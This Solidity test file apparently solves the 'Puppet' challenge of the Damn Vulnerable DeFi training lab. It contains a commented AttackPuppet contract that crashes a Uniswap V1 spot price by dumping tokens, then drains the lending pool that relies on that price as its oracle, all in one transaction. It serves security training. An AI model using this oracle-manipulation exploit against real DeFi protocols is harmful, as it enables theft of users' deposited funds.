// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;   // 10 DVT tokens in Uniswap pool
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE   = 10e18;   // 10 ETH in Uniswap pool → initial price: 1 DVT = 1 ETH
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE  = 1000e18; // player holds 1000 DVT — much more than the Uniswap reserve
    uint256 constant PLAYER_INITIAL_ETH_BALANCE    = 25e18;   // player holds 25 ETH
    uint256 constant POOL_INITIAL_TOKEN_BALANCE    = 100_000e18; // lending pool holds 100k DVT — this is what we steal

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    // Ensures the entire solution runs within a single player transaction,
    // then calls _isSolved() to verify win conditions.
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a Uniswap V1 exchange template (the logic contract all exchanges clone)
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy the Uniswap V1 factory and point it at the template
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy the DVT token
        token = new DamnValuableToken();

        // Create a Uniswap V1 exchange specifically for DVT
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool — it uses the Uniswap exchange as its price oracle
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Seed Uniswap with 10 ETH + 10 DVT liquidity → sets starting price at 1 DVT = 1 ETH
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0,                    // min_liquidity: accept any amount of LP tokens
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2   // deadline
        );

        // Give player their starting balances
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        // At the initial price (1 DVT = 1 ETH), borrowing 1 DVT requires 2 ETH collateral (2x ratio)
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * ATTACK SUMMARY:
     * ---------------
     * PuppetPool uses the Uniswap V1 spot price as its oracle to calculate
     * how much ETH collateral is needed to borrow DVT tokens.
     * The formula is: collateral = (tokenAmount * ethReserve / tokenReserve) * 2
     *
     * The vulnerability: Uniswap V1 spot price can be manipulated in the same transaction.
     *
     * Steps:
     *   1. Dump all 1000 DVT into Uniswap → floods the token reserve, crashes the ETH/DVT price.
     *      After the dump: tokenReserve ≈ 1010 DVT, ethReserve ≈ ~0.1 ETH
     *      → borrowing 100k DVT now only requires ~20 ETH collateral instead of 200k ETH.
     *   2. Call pool.borrow() with 20 ETH → borrow all 100k DVT and send to recovery.
     *
     * Everything happens in one transaction (one player nonce) via the attack contract.
     */
    function test_puppet() public checkSolvedByPlayer {
        // Deploy attack contract, funding it with 11 ETH from player.
        // (Player keeps 14 ETH; attack contract uses ~20 ETH total: 11 from player + ~9 received from Uniswap dump)
        AttackPuppet attackPuppet = new AttackPuppet{value: 11e18}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );

        // Transfer all 1000 player DVT to the attack contract so it can dump them into Uniswap
        token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);

        // Execute the attack in a single call (satisfies the "1 transaction" constraint)
        attackPuppet.start();
    }

    // Utility function to calculate Uniswap V1 token→ETH price using the constant product formula:
    // outputETH = (tokensSold * 997 * ethReserve) / (tokenReserve * 1000 + tokensSold * 997)
    // The 997/1000 factor accounts for Uniswap's 0.3% swap fee.
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract AttackPuppet {

    DamnValuableToken token;
    PuppetPool pool;
    IUniswapV1Exchange exchange;
    address recovery;

    constructor(
        DamnValuableToken _token,
        PuppetPool _pool,
        IUniswapV1Exchange _exchange,
        address _recovery
    ) payable {
        // Store references to all contracts we need to interact with
        token    = _token;
        pool     = _pool;
        exchange = _exchange;
        recovery = _recovery;
    }

    function start() public {
        // ---- STEP 1: Dump all DVT tokens into Uniswap to crash the price ----
        // We hold 1000 DVT. Uniswap only has 10 DVT and 10 ETH.
        // Selling 1000 DVT floods the token reserve, tanking the DVT price drastically.
        // After the swap: tokenReserve ≈ 1010 DVT, ethReserve ≈ 0.099 ETH
        // This means the oracle price of DVT is now almost worthless in ETH terms.
        uint ourInitialTokenBalance = token.balanceOf(address(this));

        // Approve Uniswap exchange to spend our DVT
        token.approve(address(exchange), ourInitialTokenBalance);

        // tokenToEthTransferInput: sell exact DVT, receive ETH into this contract
        // Parameters: tokensSold, minEthReceived (9 ETH slippage guard), deadline, recipient
        // We receive ~9.9 ETH back from the swap, giving us ~20.9 ETH total (11 deposited + 9.9 received)
        exchange.tokenToEthTransferInput(
            ourInitialTokenBalance, // sell all our DVT
            9e18,                   // accept minimum 9 ETH back (slippage protection)
            block.timestamp,        // deadline: current block
            address(this)           // send received ETH to this contract
        );

        // ---- STEP 2: Borrow all 100k DVT from the lending pool ----
        // After the price crash, the oracle sees DVT as nearly worthless.
        // Borrowing 100k DVT now only requires ~20 ETH collateral (down from 200k ETH).
        // We send 20 ETH and drain the entire pool, sending tokens directly to recovery.
        pool.borrow{value: 20e18}(
            token.balanceOf(address(pool)), // borrow everything the pool holds
            recovery                         // send borrowed tokens straight to recovery
        );
    }

    // Allow this contract to receive ETH from the Uniswap swap
    receive() external payable {}
}